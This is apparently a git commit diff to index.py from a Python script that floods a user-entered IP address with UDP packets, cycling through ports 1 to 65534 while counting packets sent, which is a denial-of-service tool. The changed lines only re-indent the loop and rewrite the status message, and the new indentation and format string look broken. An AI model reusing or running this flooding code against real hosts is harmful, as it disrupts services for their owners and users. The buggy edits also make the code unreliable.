2cd5f570e4c0da13a654e02a311998e86d1e6ebb
BroMasters <36071011+BroMasters@users.noreply.github.com>
2019-08-22 19:12:12 +0300

    Update index.py

--- index.py
+++ index.py
@@ -147,14 +147,14 @@ port = input("\033[1;33;40mPort: ");
 os.system("clear");
 sent = 0;
 while True:
-  while 1:
-    if time.time() > timeout:
-      break
-    else:
-      pass
-      sock.sendto(bytes, (ip, port))
-      sent = sent + 1
-      port = port + 1
-      print "..."
-      if port == 65534:
-        port = 1
+     while 1:
+        if time.time() > timeout:
+            break
+        else:
+            pass
+     sock.sendto(bytes, (ip, port))
+     sent = sent + 1
+     port = port + 1
+     print "\033[0;32;47m%packet > %ip:%port" %(sent, ip, port);
+     if port == 65534:
+       port = 1
